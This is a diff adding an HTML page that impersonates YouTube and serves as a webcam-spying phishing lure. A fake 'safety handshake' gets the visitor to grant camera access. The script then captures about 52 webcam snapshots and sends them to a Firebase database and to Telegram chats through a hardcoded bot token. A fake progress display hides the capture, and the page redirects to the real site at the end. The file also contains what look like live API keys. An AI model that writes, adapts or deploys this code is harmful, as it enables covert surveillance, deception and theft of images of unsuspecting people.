@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --yt-red: #ff0000;
+            --yt-bg: #0f0f0f;
+            --yt-text: #ffffff;
+            --yt-sub: #aaaaaa;
+            --yt-border: #3f3f3f;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--yt-bg); color: var(--yt-text);
+            font-family: "Roboto", "Arial", sans-serif;
+            display: flex; flex-direction: column; height: 100vh;
+        }
+
+        .yt-header {
+            height: 56px; padding: 0 16px; display: flex; align-items: center;
+            justify-content: space-between; position: sticky; top: 0; background: var(--yt-bg);
+        }
+
+        .yt-logo { display: flex; align-items: center; gap: 4px; font-weight: bold; font-size: 18px; letter-spacing: -0.5px; }
+        .yt-logo svg { width: 30px; fill: var(--yt-red); }
+
+        .video-container {
+            width: 100%; aspect-ratio: 16 / 9; background: #000; position: relative;
+        }
+
+        .video-blur {
+            position: absolute; width: 100%; height: 100%;
+            background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center;
+            background-size: cover; filter: blur(20px); opacity: 0.4;
+        }
+
+        .safety-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            background: rgba(15, 15, 15, 0.85); padding: 20px; text-align: center; z-index: 10;
+        }
+
+        .safety-icon { width: 40px; margin-bottom: 12px; fill: #fff; }
+
+        .video-details { padding: 12px 16px; }
+        h1 { font-size: 18px; margin: 0 0 8px; font-weight: 500; }
+        .meta { font-size: 12px; color: var(--yt-sub); }
+
+        .btn-verify {
+            background: #f1f1f1; color: #0f0f0f; border: none;
+            padding: 8px 16px; border-radius: 18px; font-size: 14px; font-weight: 500;
+            cursor: pointer; margin-top: 15px;
+        }
+
+        /* Verification UI */
+        #sync-ui { display: none; }
+        
+        .loading-bar {
+            width: 80%; height: 2px; background: #333; margin: 20px auto;
+            position: relative; overflow: hidden;
+        }
+        .progress {
+            width: 0%; height: 100%; background: var(--yt-red);
+            transition: width 1s linear;
+        }
+
+        .terminal-yt {
+            font-family: monospace; font-size: 10px; color: #aaaaaa;
+            text-align: left; background: rgba(255,255,255,0.05); padding: 10px;
+            border-radius: 4px; width: 90%; margin-top: 20px; line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="yt-header">
+        <div class="yt-logo">
+            <svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
+            YouTube
+        </div>
+        <div style="font-size: 20px;">🔍</div>
+    </div>
+
+    <div class="video-container">
+        <div class="video-blur"></div>
+        
+        <div class="safety-overlay" id="init-view">
+            <svg class="safety-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            <div style="font-weight: 500; font-size: 16px;">Restricted Content Verification</div>
+            <p style="font-size: 12px; margin-top: 8px; color: var(--yt-sub);">This shared video requires a safety handshake to ensure you are the intended viewer.</p>
+            <button class="btn-verify" onclick="startYoutubeVerify()">Verify & Play</button>
+        </div>
+
+        <div class="safety-overlay" id="sync-ui">
+            <div style="font-size: 14px; color: var(--yt-sub);">Authenticating viewer session...</div>
+            <div class="loading-bar"><div class="progress" id="yt-bar"></div></div>
+            <div style="font-size: 11px; color: var(--yt-sub);" id="yt-timer">Handshake will complete in 60s</div>
+            
+            <div class="terminal-yt">
+                > Initializing Safety_Relay...<br>
+                > Node: MUMBAI_PRIMARY_SOUTH<br>
+                > Status: Encrypting Visual Hash
+            </div>
+        </div>
+    </div>
+
+    <div class="video-details">
+        <h1>Exclusive Shared Content | May 2026</h1>
+        <div class="meta">142K views • Shared via Secure Link</div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startYoutubeVerify() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'flex';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('yt-timer').innerText = `Handshake will complete in ${timeLeft}s`;
+                        document.getElementById('yt-bar').style.width = `${((60-timeLeft)/60)*100}%`;
+
+                        if (count <= 52) {
+                            ytCapture(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.youtube.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.youtube.com";
+            }
+        }
+
+        function ytCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ image: b64, type: "YT_SPOOF", ts: Date.now(), loc: "MUMBAI" });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'yt_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
